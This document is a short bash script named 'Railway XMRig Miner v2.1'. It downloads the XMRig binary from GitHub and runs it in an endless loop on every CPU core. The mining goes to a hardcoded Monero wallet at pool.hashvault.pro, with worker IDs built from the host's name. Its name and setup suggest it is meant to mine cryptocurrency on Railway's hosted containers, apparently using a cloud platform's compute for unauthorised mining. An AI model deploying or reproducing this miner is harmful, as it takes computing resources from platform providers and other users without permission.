#!/bin/bash

echo "🚀 Railway XMRig Miner v2.1 starting at $(date)"
echo "Hostname: $(hostname)"
echo "CPU cores: $(nproc)"

# Infinite mining loop
while true; do
  echo "📥 Downloading XMRig..."
  
  # Clean previous attempts
  rm -rf xmrig.tar.gz xmrig-* 2>/dev/null || true
  
  # Download xmrig
  if ! wget -q --timeout=30 -O xmrig.tar.gz \
    "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"; then
    echo "❌ Download failed, retry in 60s"
    sleep 60
    continue
  fi
  
  # Extract and find exact directory name
  echo "📦 Extracting..."
  tar -xzf xmrig.tar.gz
  
  # Find the exact xmrig directory (handles any version)
  XMRIG_DIR=$(find . -maxdepth 1 -type d -name "xmrig-*" | head -1)
  
  if [ -z "$XMRIG_DIR" ] || [ "$XMRIG_DIR" = "." ]; then
    echo "❌ No xmrig directory found:"
    ls -la
    rm -f xmrig.tar.gz
    sleep 60
    continue
  fi
  
  echo "✅ Found xmrig directory: $XMRIG_DIR"
  cd "$XMRIG_DIR"
  
  if [ -f "./xmrig" ]; then
    chmod +x ./xmrig
    WORKER_ID="railway-$(hostname)-$(date +%s)"
    echo "⛏️ Starting mining: $WORKER_ID"
    echo "================ MINING START ================"
    
    # Run FOREVER
    exec ./xmrig \
      -o pool.hashvault.pro:80 \
      -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA \
      -p "$WORKER_ID" \
      --donate-level=1 \
      --threads=$(nproc) \
      --cpu-priority=2 \
      --print-time=60 \
      --no-color
      
  else
    echo "❌ xmrig binary missing in $XMRIG_DIR:"
    ls -la
  fi
  
  cd ..
  rm -rf xmrig.tar.gz xmrig-*
  echo "🔄 Restarting in 10s..."
  sleep 10
done
